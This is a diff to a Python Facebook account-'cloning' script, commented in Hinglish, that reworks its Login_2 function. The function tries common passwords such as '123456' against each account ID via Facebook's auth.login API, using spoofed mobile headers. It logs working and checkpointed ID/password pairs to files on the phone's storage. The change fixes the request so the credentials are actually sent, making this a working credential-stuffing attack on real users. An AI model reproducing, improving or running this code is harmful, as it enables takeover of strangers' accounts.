@@ -427,44 +427,37 @@ def login_1(uid):
 
 
 def Login_2(uid):
-    # Output indicator Screen par dikhane ke liye
-    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mCLONING\x1b[38;5;196m]\x1b[1;37m {uid}")
+    # Progress Counter Screen par show karne ke liye
+    sys.stdout.write(f"\r\r\x1b[1;37m[\x1b[38;5;196mTESTING\x1b[1;37m] {uid} ")
     sys.stdout.flush()
 
     for pw in ('123456', '123123', '1234567', '12345678', '123456789'):
         try:
-            with requests.Session() as session:
-                headers = {
-                    'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
-                    'x-fb-sim-hni': str(rr(20000, 40000)),
-                    'x-fb-net-hni': str(rr(20000, 40000)),
-                    'x-fb-connection-quality': 'EXCELLENT',
-                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-                    'user-agent': window1(),
-                    'content-type': 'application/x-www-form-urlencoded',
-                    'x-fb-http-engine': 'Liger'
-                }
-                url = f"https://b-api.facebook.com/method/auth.login?format=json"
-                
-                try:
-                    # YAHAN TIMEOUT ADD KIYA HAI (timeout=5 seconds)
-                    po = session.get(url, headers=headers, timeout=5).json()
-                except Exception as e:
-                    po = {}
-                
-                # Agar connection timeout ho jaye ya response na mile to next password check karein
-                if not po:
-                    continue
-
-                # Baaki ka Login/Response logic
-                if "access_token" in str(po):
-                    print(f"\r\033[1;32m[OK] {uid} | {pw}\033[0m")
-                    open('/sdcard/OK.txt', 'a').write(f"{uid}|{pw}\n")
-                    break
-                elif "www.facebook.com" in str(po.get("error_msg", "")):
-                    print(f"\r\033[1;33m[CP] {uid} | {pw}\033[0m")
-                    open('/sdcard/CP.txt', 'a').write(f"{uid}|{pw}\n")
-                    break
+            session = requests.Session()
+            headers = {
+                'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
+                'x-fb-sim-hni': str(rr(20000, 40000)),
+                'x-fb-net-hni': str(rr(20000, 40000)),
+                'x-fb-connection-quality': 'EXCELLENT',
+                'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
+                'user-agent': window1(),
+                'content-type': 'application/x-www-form-urlencoded',
+                'x-fb-http-engine': 'Liger'
+            }
+            url = f"https://b-api.facebook.com/method/auth.login?format=json&email={uid}&password={pw}"
+            
+            # TIMEOUT = 4 seconds added (Is se hang nahi hoga)
+            res = session.get(url, headers=headers, timeout=4)
+            po = res.json()
+            
+            if "access_token" in str(po):
+                print(f"\r\033[1;32m[OK] {uid} | {pw}\033[0m")
+                open('/sdcard/OK.txt', 'a').write(f"{uid}|{pw}\n")
+                break
+            elif "www.facebook.com" in str(po.get("error_msg", "")):
+                print(f"\r\033[1;33m[CP] {uid} | {pw}\033[0m")
+                open('/sdcard/CP.txt', 'a').write(f"{uid}|{pw}\n")
+                break
         except Exception:
             pass
 
